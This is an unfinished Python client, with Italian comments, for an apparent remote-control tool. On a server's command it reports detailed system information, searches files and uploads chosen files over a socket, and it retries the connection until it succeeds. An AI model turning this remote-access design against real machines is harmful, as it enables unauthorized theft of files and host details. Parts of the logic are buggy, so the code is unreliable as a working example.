from socket import *
import platform
import os
import time
import clientSearchFile


def main():
    while True:
        try:
            clientSocket = StartConnection()  # apre connessione

            RecuperaOs(clientSocket)

            RiceviMenu(clientSocket)  # aspetta la ricezione del da farsi
            # va in loop e non esce fin quando non si inserisce zero

            StopConnection(clientSocket)  # chiude la connessione e termina
            break
        except:
            print("errore Riavvio in corso")
            clientSocket.close()


def RiceviMenu(clientSocket: socket):  # riceve il menù e fa partire i vari metodi
    temp = ""

    while True:
        x = clientSocket.recv(2).decode()
        clientSocket.send("k".encode())  # conferma (da rimuovere)!

        if x == "1":
            print("ricevere info Sistema Operativo")
            sendOsInfo(clientSocket)

        elif x == "2":
            print("gestire la shell")
            # metti qui la tua chiamata per la shell

        elif x == "3":
            print("fare una ricerca")
            temp = clientSearchFile.searchCmd(clientSocket)

            # metti qui la tua chiamata per la ricerca

        elif x == "4":

            print("scaricare un file")
            temp = SplitLine(temp)
            temp = temp.replace("Directory of ", "")

            #controllare anche su linux
            changeDirectory(clientSocket, temp)

            temp = input()
            print(os.getcwd() + " gg " + temp)
            path = ""
            path = os.path.join(path, os.getcwd(), temp)

            if os.path.exists(path):
                clientSocket.send("ok".encode())
                getFile(clientSocket, temp+"\\")
            else:
                clientSocket.send("ko".encode())

            # metti qui la tua chiamata per scaricare un file

        elif x == "0":
            break  # chiudi la connessione


def SplitLine(mystring: str):
    for item in mystring.split("\n"):
        if "Directory of" in item:
            print(item.strip())
            return item.strip()


def changeDirectory(clientSocket, cmd):
    out = ""
    if cmd != "cd":
        cmd = cmd.replace("cd ", "")
        try:
            os.chdir(cmd)
            os.system("dir")
            out = os.getcwd()
        except:
            out = "Path not found"
    clientSocket.send(out.encode())

def getFile(clientSocket, fileName):
    fileSize = os.path.getsize(fileName)
    clientSocket.send(str(fileSize).encode())
    print(fileSize)

    file = open(fileName, 'rb')
    while fileSize > 0:
        if fileSize < 1024:
            l = file.read(fileSize)
        else:
            l = file.read(1024)
        fileSize = fileSize - 1024
        clientSocket.send(l)
        print("Caricamento...")
    print("Inviato")
    file.close()


def RecuperaOs(clientSocket: socket):
    if(platform.machine().find("Windows")):
        clientSocket.send("w".encode())
    else:
        clientSocket.send("u".encode())

def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sistema
    pack = "Architecture: " + platform.architecture()[
        0] + "\nMacchine: " + platform.machine() + "\nSystem name: " + platform.system()
    pack = pack + "\nOperating system release: " + platform.release() + "\nOperating system version: " + \
           platform.version() + "\nNode: " + platform.node() + "\nPlatform: " + platform.platform() + "\nProcessor: " + platform.processor()
    clientSocket.send(pack.encode())


def StartConnection():  # apre la connessione con il server
    serverName = 'localhost'
    serverPort = 12001
    clientSocket = socket(AF_INET, SOCK_STREAM)

    # aggiungere loop e controlli
    while True:
        try:
            clientSocket.connect((serverName, serverPort))
            break
        except:
            print("Server down")

        time.sleep(5)

    return clientSocket



def StopConnection(clientSocket: socket):  # chiude la connessione con il server
    modifiedSentence = clientSocket.recv(1024)
    print('From Server:', modifiedSentence.decode())
    clientSocket.close()


if __name__ == '__main__':
    main()

# probabilmente si puo risolvere il problema dei pacchetti alternando sempre .send e . recv
# implementare error 404

# !non scrivere codice qui sotto!

#ricevere albero fileSistem